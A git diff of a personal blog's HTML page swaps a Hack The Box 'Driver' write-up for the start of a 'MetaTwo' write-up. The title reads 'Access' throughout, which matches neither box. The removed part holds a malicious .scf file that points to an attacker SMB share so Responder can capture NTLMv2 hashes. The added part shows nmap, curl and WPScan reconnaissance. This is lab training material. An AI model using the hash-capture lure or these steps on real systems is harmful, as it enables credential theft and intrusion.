@@ -8,19 +8,19 @@
 <link rel="shortcut icon" href="https://jordangalida.github.io/images/ability_poisons.jpg" />
 <title>HTB Access Write-up | Jordan&#39;s Blog</title>
 <meta name="title" content="HTB Access Write-up" />
-<meta name="description" content="A write-up for the Driver box." />
+<meta name="description" content="A write-up for the MetaTwo box." />
 <meta name="keywords" content="HTB,Pentesting," />
 
 
 <meta property="og:url" content="https://jordangalida.github.io/htb-access-write-up/">
   <meta property="og:site_name" content="Jordan&#39;s Blog">
   <meta property="og:title" content="HTB Access Write-up">
-  <meta property="og:description" content="A write-up for the Driver box.">
+  <meta property="og:description" content="A write-up for the MetaTwo box.">
   <meta property="og:locale" content="en_US">
   <meta property="og:type" content="article">
     <meta property="article:section" content="blog">
-    <meta property="article:published_time" content="2025-02-18T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-02-18T00:00:00+00:00">
+    <meta property="article:published_time" content="2025-02-17T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-17T00:00:00+00:00">
     <meta property="article:tag" content="HTB">
     <meta property="article:tag" content="Pentesting">
     <meta property="og:image" content="https://jordangalida.github.io/images/share.png">
@@ -31,16 +31,16 @@
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="https://jordangalida.github.io/images/share.png">
   <meta name="twitter:title" content="HTB Access Write-up">
-  <meta name="twitter:description" content="A write-up for the Driver box.">
+  <meta name="twitter:description" content="A write-up for the MetaTwo box.">
 
 
 
 
   <meta itemprop="name" content="HTB Access Write-up">
-  <meta itemprop="description" content="A write-up for the Driver box.">
-  <meta itemprop="datePublished" content="2025-02-18T00:00:00+00:00">
-  <meta itemprop="dateModified" content="2025-02-18T00:00:00+00:00">
-  <meta itemprop="wordCount" content="1103">
+  <meta itemprop="description" content="A write-up for the MetaTwo box.">
+  <meta itemprop="datePublished" content="2025-02-17T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-02-17T00:00:00+00:00">
+  <meta itemprop="wordCount" content="3129">
   <meta itemprop="image" content="https://jordangalida.github.io/images/share.png">
   <meta itemprop="keywords" content="HTB,Pentesting">
 <meta name="referrer" content="no-referrer-when-downgrade" />
@@ -223,241 +223,566 @@
 <h1>HTB Access Write-up</h1>
 <p>
   <i>
-    <time datetime='2025-02-18'>
-      18 Feb, 2025
+    <time datetime='2025-02-17'>
+      17 Feb, 2025
     </time>
   </i>
 </p>
 
 <content>
-  <p>This box starts off with a website where you can upload printer drivers, which is a hint to a known critical vulnerability that happened pretty recently. The website says that anything uploaded will be reviewed by someone. In order to gain initial access, you need to upload a file that will execute when viewed such as a <code>.scf</code> or <code>.lnk</code> file that reaches out to an SMB server that we control while running a tool like <code>Responder</code>. This allows you to catch an NTLMv2 hash that can be cracked to gain access as the user Tony. To escalate privileges, you exploit the <code>PrintNightmare</code> vulnerability.</p>
+  <p>This box starts out with a WordPress plugin vulnerability that allows for unauthenticated SQL injection. After logging in as the manager user, you find out that this version of WordPress is vulnerable to an XML parsing issue in the media library that leads to an XXE vulnerability. You use this vulnerability to read the wp-config file that has credentials for the FTP user which in turn contains a file that has a user&rsquo;s credentials. You log into the box as the user, and find that a password manager named passpie is being used and contains the root user&rsquo;s credentials. The passpie hidden directory contains a PGP private key which you are able to decrypt and export root&rsquo;s password.</p>
 <hr>
-<p>We start off with our nmap scans</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap --open 10.10.11.106 -oA driver_top1k
+<p>As always, we start out with our nmap scans:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap --open 10.10.11.186 -oA Scans/metatwo_top1k
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 18:44 EST
-</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.106
-</span></span><span style="display:flex;"><span>Host is up (0.028s latency).
-</span></span><span style="display:flex;"><span>Not shown: 997 filtered tcp ports (no-response)
-</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
-</span></span><span style="display:flex;"><span>80/tcp  open  http
-</span></span><span style="display:flex;"><span>135/tcp open  msrpc
-</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
-</span></span></code></pre></div><p>We do another to scan all ports with scripting and version detection enabled</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sV -sC -p- 10.10.11.106 -oA driver_all
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 19:07 EST
-</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.106
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 10:42 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.186
+</span></span><span style="display:flex;"><span>Host is up (0.029s latency).
+</span></span><span style="display:flex;"><span>Not shown: 997 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>21/tcp open  ftp
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span></code></pre></div><p>Then we start an aggressive scan on all ports while we check out those open services</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -A -p- 10.10.11.186 -oA Scans/metatwo_all
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 10:43 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.186
 </span></span><span style="display:flex;"><span>Host is up (0.026s latency).
-</span></span><span style="display:flex;"><span>Not shown: 65531 filtered tcp ports (no-response)
-</span></span><span style="display:flex;"><span>PORT     STATE SERVICE      VERSION
-</span></span><span style="display:flex;"><span>80/tcp   open  http         Microsoft IIS httpd 10.0
-</span></span><span style="display:flex;"><span>|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
-</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
-</span></span><span style="display:flex;"><span>| http-methods:
-</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
-</span></span><span style="display:flex;"><span>| http-auth:
-</span></span><span style="display:flex;"><span>| HTTP/1.1 401 Unauthorized\x0D
-</span></span><span style="display:flex;"><span>|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
-</span></span><span style="display:flex;"><span>135/tcp  open  msrpc        Microsoft Windows RPC
-</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
-</span></span><span style="display:flex;"><span>5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
-</span></span><span style="display:flex;"><span>|_http-title: Not Found
-</span></span><span style="display:flex;"><span>Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>Not shown: 65532 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp open  ftp?
+</span></span><span style="display:flex;"><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span>|   GenericLines:
+</span></span><span style="display:flex;"><span>|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+</span></span><span style="display:flex;"><span>|     Invalid command: try being more creative
+</span></span><span style="display:flex;"><span>|_    Invalid command: try being more creative
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
+</span></span><span style="display:flex;"><span>|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://metapress.htb/
+</span></span><span style="display:flex;"><span>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port21-TCP:V=7.94SVN%I=7%D=2/17%Time=67B35928%P=x86_64-pc-linux-gnu%r(G
+</span></span><span style="display:flex;"><span>SF:enericLines,8F,&#34;220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.
+</span></span><span style="display:flex;"><span>SF:10\.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20
+</span></span><span style="display:flex;"><span>SF:creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creat
+</span></span><span style="display:flex;"><span>SF:ive\r\n&#34;);
+</span></span><span style="display:flex;"><span>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span style="display:flex;"><span>TCP/IP fingerprint:
+</span></span><span style="display:flex;"><span>OS:SCAN(V=7.94SVN%E=4%D=2/17%OT=21%CT=1%CU=30189%PV=Y%DS=2%DC=T%G=Y%TM=67B3
+</span></span><span style="display:flex;"><span>OS:59F8%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)
+</span></span><span style="display:flex;"><span>OS:SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=102%GCD=1%ISR=10D%TI
+</span></span><span style="display:flex;"><span>OS:=Z%CI=Z%II=I%TS=A)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5
+</span></span><span style="display:flex;"><span>OS:3CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O
+</span></span><span style="display:flex;"><span>OS:6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%D
+</span></span><span style="display:flex;"><span>OS:F=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0
+</span></span><span style="display:flex;"><span>OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=
+</span></span><span style="display:flex;"><span>OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
+</span></span><span style="display:flex;"><span>OS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I
+</span></span><span style="display:flex;"><span>OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Host script results:
-</span></span><span style="display:flex;"><span>| smb2-time:
-</span></span><span style="display:flex;"><span>|   date: 2025-02-19T07:09:54
-</span></span><span style="display:flex;"><span>|_  start_date: 2025-02-19T06:39:18
-</span></span><span style="display:flex;"><span>|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
-</span></span><span style="display:flex;"><span>| smb2-security-mode:
-</span></span><span style="display:flex;"><span>|   3:1:1:
-</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
-</span></span><span style="display:flex;"><span>| smb-security-mode:
-</span></span><span style="display:flex;"><span>|   account_used: guest
-</span></span><span style="display:flex;"><span>|   authentication_level: user
-</span></span><span style="display:flex;"><span>|   challenge_response: supported
-</span></span><span style="display:flex;"><span>|_  message_signing: disabled (dangerous, but default)
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Network Distance: 2 hops
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 155.05 seconds
-</span></span></code></pre></div><p>Let&rsquo;s check out the website and see if there are any SMB shares we can view</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$smbclient -N -L //10.10.11.106/
-</span></span><span style="display:flex;"><span>session setup failed: NT_STATUS_ACCESS_DENIED
-</span></span></code></pre></div><p>No dice. Let&rsquo;s look at the website. Immediately upon visiting the website, we are asked to login
-<img src="/images/Driver/login.png" alt="Login"></p>
-<p>We try a simple credential pair <code>admin:admin</code> and we get in
-<img src="/images/Driver/homepage.png" alt="Homepage"></p>
-<p>On the /fw_up.php page it looks like we can upload firmware
-<img src="/images/Drive/firmware" alt="Firmware"></p>
-<p>Since this is a Windows box, let&rsquo;s try to upload a reverse shell. Nothing. It says that a user will review the files, so can we get something to execute when someone visits wherever this file is being uploaded? Yes, we can use a .lnk or .scf file</p>
-<pre tabindex="0"><code class="language-scf" data-lang="scf">$cat click.scf
-[Shell]
-Command=2
-IconFile=\\10.10.14.24\share\legit.ico
-[Taskbar]
-Command=ToggleDesktop
-</code></pre><p>Then set up responder, and upload the file</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo responder -I tun0 -w
-</span></span><span style="display:flex;"><span>                                         __
-</span></span><span style="display:flex;"><span>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
-</span></span><span style="display:flex;"><span>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
-</span></span><span style="display:flex;"><span>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
-</span></span><span style="display:flex;"><span>                   |__|
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>TRACEROUTE (using port 3389/tcp)
+</span></span><span style="display:flex;"><span>HOP RTT      ADDRESS
+</span></span><span style="display:flex;"><span>1   25.28 ms 10.10.14.1
+</span></span><span style="display:flex;"><span>2   25.55 ms 10.10.11.186
+</span></span></code></pre></div><p>Let&rsquo;s start going down the list. First up, is FTP. Trying to login anonymously doesn&rsquo;t work. We don&rsquo;t have anything for SSH, so let&rsquo;s try the website. Upon navigating to the IP, the site resolves to &ldquo;metapress.htb&rdquo; which obviously won&rsquo;t load so we have to add it to our /etc/hosts</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$tail -n <span style="color:#ae81ff">1</span> /etc/hosts
+</span></span><span style="display:flex;"><span>10.10.11.186    metapress.htb
+</span></span></code></pre></div><p>Then we can see the website
+<img src="/images/MetaTwo/website.png" alt="Website"></p>
+<p>There is a link to an events page
+<img src="/images/MetaTwo/events.png" alt="Events"></p>
+<p>We submit an event, but nothing really stands out. However, in burp, we see the HTTP traffic includes &ldquo;wp-admin&rdquo; which means this site is using WordPress. We can curl the page and see if we can see a version number</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$curl -s http://metapress.htb | grep WordPress
+</span></span><span style="display:flex;"><span>&lt;meta name=&#34;generator&#34; content=&#34;WordPress 5.6.2&#34; /&gt;
+</span></span><span style="display:flex;"><span>                                Proudly powered by &lt;a href=&#34;https://wordpress.org/&#34;&gt;WordPress&lt;/a&gt;. &lt;/div&gt;&lt;!-- .powered-by --&gt;
+</span></span></code></pre></div><p>Let&rsquo;s also curl for some themes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$curl -s http://metapress.htb | grep themes
+</span></span><span style="display:flex;"><span>&lt;link rel=&#39;stylesheet&#39; id=&#39;twenty-twenty-one-style-css&#39;  href=&#39;http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1&#39; media=&#39;all&#39; /&gt;
+</span></span><span style="display:flex;"><span>&lt;link rel=&#39;stylesheet&#39; id=&#39;twenty-twenty-one-print-style-css&#39;  href=&#39;http://metapress.htb/wp-content/themes/twentytwentyone/assets/css/print.css?ver=1.1&#39; media=&#39;print&#39; /&gt;
+</span></span><span style="display:flex;"><span>( Element.prototype.matches &amp;&amp; Element.prototype.closest &amp;&amp; window.NodeList &amp;&amp; NodeList.prototype.forEach ) || document.write( &#39;&lt;script src=&#34;http://metapress.htb/wp-content/themes/twentytwentyone/assets/js/polyfills.js?ver=1.1&#34;&gt;&lt;/scr&#39; + &#39;ipt&gt;&#39; );
+</span></span><span style="display:flex;"><span>&lt;script src=&#39;http://metapress.htb/wp-content/themes/twentytwentyone/assets/js/primary-navigation.js?ver=1.1&#39; id=&#39;twenty-twenty-one-primary-navigation-script-js&#39;&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>&lt;script src=&#39;http://metapress.htb/wp-content/themes/twentytwentyone/assets/js/responsive-embeds.js?ver=1.1&#39; id=&#39;twenty-twenty-one-responsive-embeds-script-js&#39;&gt;&lt;/script&gt;
+</span></span></code></pre></div><p>Ok, let&rsquo;s run WPScan</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$docker run -it --rm --network<span style="color:#f92672">=</span>host wpscanteam/wpscan -e ap -t <span style="color:#ae81ff">500</span> --url http://metapress.htb
+</span></span><span style="display:flex;"><span>_______________________________________________________________
+</span></span><span style="display:flex;"><span>         __          _______   _____
+</span></span><span style="display:flex;"><span>         \ \        / /  __ \ / ____|
+</span></span><span style="display:flex;"><span>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+</span></span><span style="display:flex;"><span>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
+</span></span><span style="display:flex;"><span>            \  /\  /  | |     ____) | (__| (_| | | | |
+</span></span><span style="display:flex;"><span>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>         WordPress Security Scanner by the WPScan Team
+</span></span><span style="display:flex;"><span>                         Version 3.8.27
+</span></span><span style="display:flex;"><span>       Sponsored by Automattic - https://automattic.com/
+</span></span><span style="display:flex;"><span>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+</span></span><span style="display:flex;"><span>_______________________________________________________________
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  To support this project:
-</span></span><span style="display:flex;"><span>  Patreon -&gt; https://www.patreon.com/PythonResponder
-</span></span><span style="display:flex;"><span>  Paypal  -&gt; https://paypal.me/PythonResponder
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] URL: http://metapress.htb/ [10.10.11.186]
+</span></span><span style="display:flex;"><span>[+] Started: Mon Feb 17 17:12:10 2025
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
-</span></span><span style="display:flex;"><span>  To kill this script hit CTRL-C
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Interesting Finding(s):
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Poisoners:
-</span></span><span style="display:flex;"><span>    LLMNR                      [ON]
-</span></span><span style="display:flex;"><span>    NBT-NS                     [ON]
-</span></span><span style="display:flex;"><span>    MDNS                       [ON]
-</span></span><span style="display:flex;"><span>    DNS                        [ON]
-</span></span><span style="display:flex;"><span>    DHCP                       [OFF]
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Headers
+</span></span><span style="display:flex;"><span> | Interesting Entries:
+</span></span><span style="display:flex;"><span> |  - Server: nginx/1.18.0
+</span></span><span style="display:flex;"><span> |  - X-Powered-By: PHP/8.0.24
+</span></span><span style="display:flex;"><span> | Found By: Headers (Passive Detection)
+</span></span><span style="display:flex;"><span> | Confidence: 100%
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Servers:
-</span></span><span style="display:flex;"><span>    HTTP server                [ON]
-</span></span><span style="display:flex;"><span>    HTTPS server               [ON]
-</span></span><span style="display:flex;"><span>    WPAD proxy                 [ON]
-</span></span><span style="display:flex;"><span>    Auth proxy                 [OFF]
-</span></span><span style="display:flex;"><span>    SMB server                 [ON]
-</span></span><span style="display:flex;"><span>    Kerberos server            [ON]
-</span></span><span style="display:flex;"><span>    SQL server                 [ON]
-</span></span><span style="display:flex;"><span>    FTP server                 [ON]
-</span></span><span style="display:flex;"><span>    IMAP server                [ON]
-</span></span><span style="display:flex;"><span>    POP3 server                [ON]
-</span></span><span style="display:flex;"><span>    SMTP server                [ON]
-</span></span><span style="display:flex;"><span>    DNS server                 [ON]
-</span></span><span style="display:flex;"><span>    LDAP server                [ON]
-</span></span><span style="display:flex;"><span>    RDP server                 [ON]
-</span></span><span style="display:flex;"><span>    DCE-RPC server             [ON]
-</span></span><span style="display:flex;"><span>    WinRM server               [ON]
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] robots.txt found: http://metapress.htb/robots.txt
+</span></span><span style="display:flex;"><span> | Interesting Entries:
+</span></span><span style="display:flex;"><span> |  - /wp-admin/
+</span></span><span style="display:flex;"><span> |  - /wp-admin/admin-ajax.php
+</span></span><span style="display:flex;"><span> | Found By: Robots Txt (Aggressive Detection)
+</span></span><span style="display:flex;"><span> | Confidence: 100%
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] HTTP Options:
-</span></span><span style="display:flex;"><span>    Always serving EXE         [OFF]
-</span></span><span style="display:flex;"><span>    Serving EXE                [OFF]
-</span></span><span style="display:flex;"><span>    Serving HTML               [OFF]
-</span></span><span style="display:flex;"><span>    Upstream Proxy             [OFF]
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php
+</span></span><span style="display:flex;"><span> | Found By: Direct Access (Aggressive Detection)
+</span></span><span style="display:flex;"><span> | Confidence: 100%
+</span></span><span style="display:flex;"><span> | References:
+</span></span><span style="display:flex;"><span> |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+</span></span><span style="display:flex;"><span> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+</span></span><span style="display:flex;"><span> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+</span></span><span style="display:flex;"><span> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+</span></span><span style="display:flex;"><span> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Poisoning Options:
-</span></span><span style="display:flex;"><span>    Analyze Mode               [OFF]
-</span></span><span style="display:flex;"><span>    Force WPAD auth            [OFF]
-</span></span><span style="display:flex;"><span>    Force Basic Auth           [OFF]
-</span></span><span style="display:flex;"><span>    Force LM downgrade         [OFF]
-</span></span><span style="display:flex;"><span>    Force ESS downgrade        [OFF]
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] WordPress readme found: http://metapress.htb/readme.html
+</span></span><span style="display:flex;"><span> | Found By: Direct Access (Aggressive Detection)
+</span></span><span style="display:flex;"><span> | Confidence: 100%
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Generic Options:
-</span></span><span style="display:flex;"><span>    Responder NIC              [tun0]
-</span></span><span style="display:flex;"><span>    Responder IP               [10.10.14.24]
-</span></span><span style="display:flex;"><span>    Responder IPv6             [dead:beef:2::1016]
-</span></span><span style="display:flex;"><span>    Challenge set              [random]
-</span></span><span style="display:flex;"><span>    Don&#39;t Respond To Names     [&#39;ISATAP&#39;]
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php
+</span></span><span style="display:flex;"><span> | Found By: Direct Access (Aggressive Detection)
+</span></span><span style="display:flex;"><span> | Confidence: 60%
+</span></span><span style="display:flex;"><span> | References:
+</span></span><span style="display:flex;"><span> |  - https://www.iplocation.net/defend-wordpress-from-ddos
+</span></span><span style="display:flex;"><span> |  - https://github.com/wpscanteam/wpscan/issues/1299
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Current Session Variables:
-</span></span><span style="display:flex;"><span>    Responder Machine Name     [WIN-6AUOB2VBSPK]
-</span></span><span style="display:flex;"><span>    Responder Domain Name      [WG6O.LOCAL]
-</span></span><span style="display:flex;"><span>    Responder DCE-RPC Port     [48873]
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
+</span></span><span style="display:flex;"><span> | Found By: Rss Generator (Passive Detection)
+</span></span><span style="display:flex;"><span> |  - http://metapress.htb/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;
+</span></span><span style="display:flex;"><span> |  - http://metapress.htb/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Listening for events...
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] WordPress theme in use: twentytwentyone
+</span></span><span style="display:flex;"><span> | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
+</span></span><span style="display:flex;"><span> | Last Updated: 2024-11-13T00:00:00.000Z
+</span></span><span style="display:flex;"><span> | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt
+</span></span><span style="display:flex;"><span> | [!] The version is out of date, the latest version is 2.4
+</span></span><span style="display:flex;"><span> | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
+</span></span><span style="display:flex;"><span> | Style Name: Twenty Twenty-One
+</span></span><span style="display:flex;"><span> | Style URI: https://wordpress.org/themes/twentytwentyone/
+</span></span><span style="display:flex;"><span> | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
+</span></span><span style="display:flex;"><span> | Author: the WordPress team
+</span></span><span style="display:flex;"><span> | Author URI: https://wordpress.org/
+</span></span><span style="display:flex;"><span> |
+</span></span><span style="display:flex;"><span> | Found By: Css Style In Homepage (Passive Detection)
+</span></span><span style="display:flex;"><span> | Confirmed By: Css Style In 404 Page (Passive Detection)
+</span></span><span style="display:flex;"><span> |
